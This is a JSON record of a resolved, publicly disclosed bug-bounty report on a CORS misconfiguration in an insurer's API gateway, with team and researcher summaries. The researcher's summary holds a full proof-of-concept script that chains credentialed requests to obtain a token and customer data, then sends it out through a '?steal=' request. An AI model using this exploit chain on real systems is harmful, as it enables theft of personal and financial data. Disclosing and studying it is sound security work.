{"id":688567,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC82ODg1Njc=","url":"https://hackerone.com/reports/688567","title":"CORS misconfiguration allows to steal client's \"password\", Authorization token and the customer details e.g. names, SSN, bank account etc.","state":"Closed","substate":"resolved","severity_rating":"high","readable_substate":"Resolved","created_at":"2019-09-05T09:51:13.127Z","submitted_at":"2019-09-05T09:51:13.127Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"muon4","url":"/muon4","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":8416,"url":"https://hackerone.com/localtapiola","handle":"localtapiola","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"LocalTapiola","twitter_handle":"","website":"http://www.lahitapiola.fi","about":"LocalTapiolaâ€™s products and services cover non-life, life and pension insurance, as well as investment and saving services."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"no-content","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2019-12-13T12:34:54.968Z","bug_reporter_agreed_on_going_public_at":"2019-12-13T12:34:54.914Z","team_member_agreed_on_going_public_at":"2019-12-13T12:21:47.316Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"","bounty_amount":"1984.0","formatted_bounty":"$1,984","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":83,"voters":["jiikoo1","secator","tk0","base_64","sameerphad72","prophet","mik317","dhakal_ananda","ali","the_unlucky_guy","and 73 more..."],"severity":{"rating":"high","author_type":"User"},"structured_scope":{"databaseId":31828,"asset_type":"URL","asset_identifier":"ext-gw.lahitapiola.fi","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":5742463,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2019-09-05T21:09:46.828Z","updated_at":"2019-09-05T21:09:46.828Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5834541,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2019-09-18T11:27:51.876Z","updated_at":"2019-09-18T11:28:15.232Z","actor":{"username":"muon4","cleared":true,"url":"/muon4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":5876959,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2019-09-24T11:54:14.284Z","updated_at":"2019-09-24T11:54:14.284Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5881269,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2019-09-24T20:30:59.066Z","updated_at":"2019-09-24T20:30:59.066Z","actor":{"url":"/localtapiola","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/008/416/b6fbd7e94497b0ffaee584d2e7096c5d5e2082e2_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"LocalTapiola"}},"bounty_amount":"1984.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"localtapiola","collaborator":{"username":"muon4","url":"/muon4"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":5883616,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"","automated_response":false,"created_at":"2019-09-25T05:17:13.638Z","updated_at":"2019-09-25T05:17:13.638Z","actor":{"username":"muon4","cleared":true,"url":"/muon4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6410395,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","automated_response":false,"created_at":"2019-11-26T10:30:53.283Z","updated_at":"2019-11-26T10:30:53.283Z","actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"muon4","url":"/muon4"},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6541315,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-12-13T12:21:47.333Z","updated_at":"2019-12-13T12:21:47.333Z","first_to_agree":true,"actor":{"username":"localtapiola-thomas","cleared":false,"url":"/localtapiola-thomas","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6541377,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2019-12-13T12:34:54.935Z","updated_at":"2019-12-13T12:34:54.935Z","actor":{"username":"muon4","cleared":true,"url":"/muon4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6541378,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2019-12-13T12:34:54.982Z","updated_at":"2019-12-13T12:34:54.982Z","actor":{"username":"muon4","cleared":true,"url":"/muon4","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"localtapiola","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"id":19254,"category":"team","content":"##Issue\n\nThe reporter found that ext-gw.lahitapiola.fi had a faulty CORS configuration. \n\n##Fix\n\nLogic and processing around CORS was improved and the issue was fixed.\n\n##Reasoning\n\nThe issue is real. CORS as a bug and flaw has real impact. The report was well written and had a good working PoC. This is essential - we are not looking for speculative reports discussing missing headers and citating Wikipedia or OWASP. A real PoC shows the real impact - and in this case we were happy to have a report that was actionable. ","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":60017,"username":"localtapiola-thomas","name":"localtapiola-thomas","bio":"LocalTapiola Bug Bounty Coordinator - @tsmalmbe","cleared":false,"website":"http://www.lahitapiola.fi","location":"Espoo, Finland","created_at":"2016-03-09T13:58:17.117Z","url":"https://hackerone.com/localtapiola-thomas","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"user_type":"legacy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/060/017/8cccb6dc22038468aec723dab1945e7df637da6b_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://hackerone.com/rails/active_storage/representations/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaHBBcWtrIiwiZXhwIjpudWxsLCJwdXIiOiJibG9iX2lkIn19--ef0702cef87b20f1437c9a717c8b44719b380f58/eyJfcmFpbHMiOnsibWVzc2FnZSI6IkJBaDdCam9MY21WemFYcGxTU0lOTWpZd2VESTJNRDRHT2daRlZBPT0iLCJleHAiOm51bGwsInB1ciI6InZhcmlhdGlvbiJ9fQ==--7e37b612eb3c91a96f98ad01ca9fbe53cab870dd/hackerone-userlogo.png"}}},{"id":19022,"category":"researcher","content":"CORS misconfiguration allowed to steal customer details e.g. name, SSN, bank account and other customer critical information from logged users.\n\nProgram handled report very well and gave me a reasonable bounty. Thanks!\n\nHere is the PoC code:\n\n```\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n\u003cbody\u003e\n\u003ccenter\u003e\n\u003ch3\u003eSteal customer data!\u003c/h3\u003e\n\n\u003cdiv id=\"demo\"\u003e\n\u003c/div\u003e\n\n\u003cscript\u003e\nfunction cors() {\n  var xhttp = new XMLHttpRequest();\n  xhttp.onreadystatechange = function() {\n    if (this.readyState == 4 \u0026\u0026 this.status == 200) {\n    var parse = JSON.parse(this.response);\n    window.uid = parse.cel_uuid;  \n    setTimeout(cors2, 500);\n    }\n  };\n  xhttp.open(\"GET\", \"https://ext-gw.lahitapiola.fi:7000/local-tapiola/lt-ext-prod/api/preOAuth\", true);\n  xhttp.withCredentials = true;\n  xhttp.setRequestHeader(\"X-IBM-Client-Id\", \"84214774-3012-4b7f-a7a5-278188a90c9e\");\n  xhttp.send();\n}\n\nfunction cors2()\n{\n  var xhttp = new XMLHttpRequest();\n  xhttp.onreadystatechange = function() {\n    if (this.readyState == 4 \u0026\u0026 this.status == 200) {\n    var parse = JSON.parse(this.response);\n    window.token2 = parse.access_token;\n    setTimeout(cors3, 500);\n    }\n  };\n  xhttp.open(\"POST\", \"https://ext-gw.lahitapiola.fi:7000/local-tapiola/lt-ext-prod/api/oauth/oauth2/token\", true);\n  xhttp.withCredentials = true;\n  xhttp.setRequestHeader(\"X-IBM-Client-Id\", \"84214774-3012-4b7f-a7a5-278188a90c9e\");\n  xhttp.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded; charset=UTF-8\")\n  var params = \"grant_type=password\u0026client_id=84214774-3012-4b7f-a7a5-278188a90c9e\u0026username=mfnol\u0026password=\"+uid+\"\u0026scope=scope1\";\n  xhttp.send(params);\n}\n\nfunction cors3()\n{\n  var xhttp = new XMLHttpRequest();\n  xhttp.onreadystatechange = function() {\n    if (this.readyState == 4 \u0026\u0026 this.status == 200) {\n    document.getElementById(\"demo\").innerHTML = alert(this.responseText);\n    window.response = this.responseText;\n    setTimeout(cors4, 500);\n    }\n  };\n  xhttp.open(\"GET\", \"https://ext-gw.lahitapiola.fi:7000/local-tapiola/lt-ext-prod/api/customerInformation\", true);\n  xhttp.withCredentials = true;\n  xhttp.setRequestHeader(\"X-IBM-Client-Id\", \"84214774-3012-4b7f-a7a5-278188a90c9e\");\n  xhttp.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded; charset=UTF-8\")\n  xhttp.setRequestHeader(\"Authorization\", \"Bearer \"+token2);\n  xhttp.send();\n}\nfunction cors4()\n{\nvar xhttp = new XMLHttpRequest();\nxhttp.open(\"GET\", \"http://localhost/?steal=\"+encodeURI(response), true);\nxhttp.withCredentials = true;\nxhttp.send();\n}\ncors()\n\u003c/script\u003e\n\n\u003c/body\u003e\n\u003c/html\u003e\n```","can_view?":true,"can_create?":false,"attachments":[],"user":{"id":59198,"username":"muon4","name":"Juho Myllys","bio":"White hat hacker from ðŸ‡«ðŸ‡®  ","cleared":true,"website":null,"location":"Finland","created_at":"2016-03-04T05:48:16.949Z","url":"https://hackerone.com/muon4","anc_triager":false,"hackerone_triager":false,"hackerone_employee":false,"hacker_resume_enabled":true,"user_type":"hacker","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c","xtralarge":"https://profile-photos.hackerone-user-content.com/variants/000/059/198/429603a5d61e7bc28452e32313e498cdfa655d87_original.png/c11036e2d3f8b05af4b5da5984ccdec6f786b763c8abceb4e68042e10dcdae85"}}}]}